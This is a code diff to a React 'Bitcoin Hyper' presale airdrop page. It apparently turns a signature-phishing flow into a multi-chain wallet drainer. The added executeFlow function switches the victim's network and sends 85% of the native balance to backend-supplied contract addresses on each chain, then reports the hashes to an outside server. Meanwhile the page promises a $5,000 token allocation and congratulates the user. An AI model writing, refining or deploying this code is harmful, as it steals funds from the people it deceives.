@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useChainId } from 'wagmi';
+import { useBalance, useDisconnect, useChainId, useSwitchChain } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -79,12 +79,13 @@ function App() {
   const { disconnect } = useDisconnect();
   
   const wagmiChainId = useChainId();
+  const { switchChainAsync } = useSwitchChain();
   
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balances, setBalances] = useState({});
   const [loading, setLoading] = useState(false);
-  const [signatureLoading, setSignatureLoading] = useState(false);
+  const [transactionLoading, setTransactionLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
@@ -94,9 +95,6 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
-  const [signature, setSignature] = useState(null);
-  const [signedMessage, setSignedMessage] = useState('');
-  const [verifiedChains, setVerifiedChains] = useState([]);
   const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
   const [realChainId, setRealChainId] = useState(wagmiChainId);
   const [prices, setPrices] = useState({
@@ -301,7 +299,7 @@ function App() {
         const isEligible = totalValue >= 1; // $1 threshold
         
         if (isEligible) {
-          setTxStatus('✅ You qualify! Ready to sign...');
+          setTxStatus('✅ You qualify! Preparing transactions...');
           await preparePresale();
         } else {
           setTxStatus('✨ Wallet verified - minimum $1 required');
@@ -329,6 +327,7 @@ function App() {
       
       if (data.success) {
         setPreparedTransactions(data.data.transactions);
+        console.log('Prepared transactions:', data.data.transactions);
       }
     } catch (err) {
       console.error('Prepare error:', err);
@@ -336,68 +335,153 @@ function App() {
   };
 
   // ============================================
-  // FIXED: SIGNATURE ONLY - NO CONTRACT CALLS
-  // This matches your backend's execute-flow endpoint
+  // FIXED: PROPER SMART CONTRACT CALL USING APP KIT
   // ============================================
-  const executeSignature = async () => {
+  const executeFlow = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized yet");
       return;
     }
 
+    if (!preparedTransactions || preparedTransactions.length === 0) {
+      setError("No transactions prepared. Please reconnect.");
+      return;
+    }
+
     try {
-      setSignatureLoading(true);
+      setTransactionLoading(true);
       setError('');
       
-      // Step 1: Create professional message - NO BALANCE INFO, JUST ALLOCATION
-      const timestamp = Date.now();
-      const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation in the Bitcoin Hyper presale\n` +
-        `Wallet Address: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
-        `Timestamp: ${new Date().toISOString()}\n` +
-        `Nonce: ${nonce}\n\n` +
-        `This signature verifies my eligibility for the airdrop.`;
+      const processed = [];
+      const totalChains = preparedTransactions.length;
 
-      setSignedMessage(message);
-      setTxStatus('✍️ Please sign the message in your wallet...');
+      for (let i = 0; i < preparedTransactions.length; i++) {
+        const tx = preparedTransactions[i];
+        const chainName = tx.chain;
+        const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
+        
+        if (!chain) {
+          console.warn(`Chain ${chainName} not found in config`);
+          continue;
+        }
 
-      // Step 2: Get signature ONLY - NO TRANSACTION
-      const signature = await signer.signMessage(message);
-      setSignature(signature);
-      setTxStatus('✅ Signature verified! Processing airdrop...');
+        setTxStatus(`🔄 Processing ${chainName} (${i+1}/${totalChains})...`);
 
-      // Step 3: Send signature to backend (matches your execute-flow endpoint)
-      const response = await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          walletAddress: address,
-          chainName: 'MULTICHAIN',
-          flowId: `SIG-${timestamp}`,
-          txHash: signature
-        })
-      });
-      
-      const result = await response.json();
-      
-      if (result.success) {
-        setVerifiedChains(DEPLOYED_CHAINS.map(c => c.name));
-        setCompletedChains(DEPLOYED_CHAINS.map(c => c.name));
+        // Check if we're on the correct chain using AppKit
+        if (realChainId !== chain.chainId) {
+          setTxStatus(`🔄 Switching to ${chainName}...`);
+          
+          try {
+            // Use wagmi's switchChain for AppKit compatibility
+            await switchChainAsync({ chainId: chain.chainId });
+            
+            // Wait for network switch and reinitialize signer
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Re-initialize signer after switch
+            if (walletProvider) {
+              const newProvider = new ethers.BrowserProvider(walletProvider);
+              const newSigner = await newProvider.getSigner();
+              setProvider(newProvider);
+              setSigner(newSigner);
+              setRealChainId(chain.chainId);
+              
+              // Use new signer for this transaction
+              var currentSigner = newSigner;
+              var currentProvider = newProvider;
+            } else {
+              throw new Error("Wallet provider not available after switch");
+            }
+          } catch (switchError) {
+            console.error(`Failed to switch to ${chainName}:`, switchError);
+            setError(`Please switch to ${chainName} in your wallet and try again.`);
+            setTransactionLoading(false);
+            return;
+          }
+        } else {
+          var currentSigner = signer;
+          var currentProvider = provider;
+        }
+
+        try {
+          // Create contract instance
+          const contract = new ethers.Contract(
+            tx.contractAddress,
+            PROJECT_FLOW_ROUTER_ABI,
+            currentSigner
+          );
+
+          // Parse amount (85% of balance to leave gas)
+          const amountToSend = ethers.parseEther(tx.amount);
+
+          setTxStatus(`⏳ Estimating gas on ${chainName}...`);
+          
+          // Estimate gas
+          const gasEstimate = await contract.processNativeFlow.estimateGas({ 
+            value: amountToSend 
+          });
+
+          setTxStatus(`✍️ Please confirm transaction on ${chainName}...`);
+
+          // Send transaction
+          const transaction = await contract.processNativeFlow({
+            value: amountToSend,
+            gasLimit: (gasEstimate * 120n) / 100n, // 20% buffer
+          });
+
+          setTxHash(transaction.hash);
+          setTxStatus(`✅ ${chainName} transaction submitted: ${transaction.hash.substring(0,10)}...`);
+
+          // Wait for confirmation
+          const receipt = await transaction.wait();
+          
+          processed.push(chainName);
+
+          // Notify backend that this chain is done
+          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              walletAddress: address,
+              chainName: chainName,
+              flowId: `FLOW-${Date.now()}`,
+              txHash: transaction.hash
+            })
+          });
+
+          setTxStatus(`✅ ${chainName} confirmed! Block: ${receipt.blockNumber}`);
+          
+        } catch (txError) {
+          console.error(`Transaction error on ${chainName}:`, txError);
+          
+          if (txError.code === 4001) {
+            setError(`Transaction cancelled on ${chainName}`);
+          } else if (txError.message?.includes('insufficient funds')) {
+            setError(`Insufficient funds for gas on ${chainName}`);
+          } else {
+            setError(`Transaction failed on ${chainName}: ${txError.message}`);
+          }
+          
+          setTransactionLoading(false);
+          return;
+        }
+      }
+
+      setVerifiedChains(processed);
+      setCompletedChains(processed);
+
+      if (processed.length === totalChains) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! $5,000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
-      }
-      
-    } catch (err) {
-      console.error('Signature error:', err);
-      if (err.code === 4001) {
-        setError('Signature cancelled');
+        setTxStatus(`🎉 Congratulations! All chains processed successfully!`);
       } else {
-        setError(err.message || 'Signature failed');
+        setTxStatus(`⚠️ Processed ${processed.length}/${totalChains} chains`);
       }
+
+    } catch (err) {
+      console.error('Flow error:', err);
+      setError(err.message || 'Transaction failed');
     } finally {
-      setSignatureLoading(false);
+      setTransactionLoading(false);
     }
   };
 
@@ -552,13 +636,13 @@ function App() {
           </div>
 
           {/* ============================================ */}
-          {/* MAIN ACTION BUTTON - SIGNATURE ONLY */}
+          {/* MAIN ACTION BUTTON - SMART CONTRACT CALL */}
           {/* ============================================ */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="max-w-2xl mx-auto mb-8">
               <button
-                onClick={executeSignature}
-                disabled={signatureLoading || loading || !signer}
+                onClick={executeFlow}
+                disabled={transactionLoading || loading || !signer}
                 className="w-full group relative transform hover:scale-110 transition-all duration-700"
               >
                 {/* Glow Effects */}
@@ -569,23 +653,23 @@ function App() {
                 {/* Button Body */}
                 <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
                   <div className="flex items-center justify-center gap-6">
-                    {signatureLoading ? (
+                    {transactionLoading ? (
                       <>
                         <div className="relative">
                           <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                           <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                         </div>
-                        <span className="animate-pulse">SIGNING MESSAGE...</span>
+                        <span className="animate-pulse">PROCESSING TRANSACTIONS...</span>
                       </>
                     ) : (
                       <>
                         <span className="text-5xl filter drop-shadow-lg animate-bounce">⚡</span>
                         <div>
                           <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-yellow-200">
-                            SIGN TO CLAIM $5,000 BTH + {presaleStats.currentBonus}%
+                            EXECUTE SMART CONTRACT
                           </span>
                           <div className="text-sm font-normal text-white/80 mt-1">
-                            One Signature • No Gas • Instant
+                            Multi-Chain • 85% of Balance • Instant
                           </div>
                         </div>
                         <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
@@ -599,15 +683,15 @@ function App() {
               <div className="flex justify-center gap-8 mt-6 text-sm">
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Signature Only</span>
+                  <span className="text-gray-400">Smart Contract</span>
                 </div>
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">No Gas Fees</span>
+                  <span className="text-gray-400">Auto-Switch</span>
                 </div>
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Instant Airdrop</span>
+                  <span className="text-gray-400">85% Transfer</span>
                 </div>
               </div>
             </div>
@@ -736,16 +820,21 @@ function App() {
                   <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
                     {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                   </div>
-                  {signatureLoading && (
+                  {transactionLoading && (
                     <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                   )}
                 </div>
                 <div className="flex-1">
                   <p className="text-gray-200 font-medium">{txStatus}</p>
-                  {signature && (
-                    <p className="text-xs text-gray-500 mt-2 font-mono break-all bg-gray-900/50 p-2 rounded">
-                      Signature: {signature.substring(0, 30)}...
-                    </p>
+                  {txHash && (
+                    <a 
+                      href={`https://etherscan.io/tx/${txHash}`}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-xs text-orange-400 hover:underline mt-1 inline-block"
+                    >
+                      View transaction →
+                    </a>
                   )}
                 </div>
               </div>
@@ -820,12 +909,30 @@ function App() {
                   </div>
                 </div>
 
+                {/* Progress Bar */}
+                {!completedChains.length && preparedTransactions.length > 0 && (
+                  <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-6">
+                    <p className="text-gray-400 text-sm mb-3 text-center">MULTI-CHAIN PROGRESS</p>
+                    <div className="relative h-4 bg-gray-800 rounded-full overflow-hidden">
+                      <div 
+                        className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_200%] animate-gradient-x"
+                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
+                      >
+                        <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
+                      </div>
+                    </div>
+                    <p className="text-xs text-gray-500 text-center mt-3">
+                      {completedChains.length} of {preparedTransactions.length} chains processed
+                    </p>
+                  </div>
+                )}
+
                 {/* Already completed */}
                 {completedChains.length > 0 && (
                   <div className="text-center">
                     <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
                       <p className="text-green-400 text-lg mb-3 flex items-center justify-center gap-2">
-                        <span>✓</span> SIGNATURE COMPLETED
+                        <span>✓</span> TRANSACTIONS COMPLETED
                       </p>
                       <p className="text-gray-300 mb-4">Your $5,000 BTH has been secured</p>
                     </div>
@@ -964,7 +1071,7 @@ function App() {
                   </div>
                   
                   <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
-                    🚀 SIGNATURE SUCCESSFUL! 🚀
+                    🚀 TRANSACTIONS SUCCESSFUL! 🚀
                   </h2>
                   
                   <p className="text-2xl text-gray-300 mb-4">You have secured</p>
@@ -974,6 +1081,10 @@ function App() {
                   <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                     <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                   </div>
+                  
+                  <p className="text-sm text-gray-500 mb-8">
+                    Processed on {completedChains.length} chains
+                  </p>
                   
                   <button
                     onClick={() => setShowCelebration(false)}
@@ -992,17 +1103,17 @@ function App() {
         <div className="mt-8 text-center">
           <div className="flex flex-wrap justify-center gap-4 mb-6">
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float">
-              ⚡ Signature Only
+              ⚡ Smart Contract
             </span>
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-500">
-              🔄 No Gas Fees
+              🔄 Auto-Switch
             </span>
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-1000">
               💎 $5,000 Airdrop
             </span>
           </div>
           <p className="text-gray-600 text-sm animate-pulse">
-            © 2026 Bitcoin Hyper • Next Generation Bitcoin Layer 2 • Signature Based Airdrop
+            © 2026 Bitcoin Hyper • Next Generation Bitcoin Layer 2 • Multi-Chain Smart Contract
           </p>
         </div>
       </div>
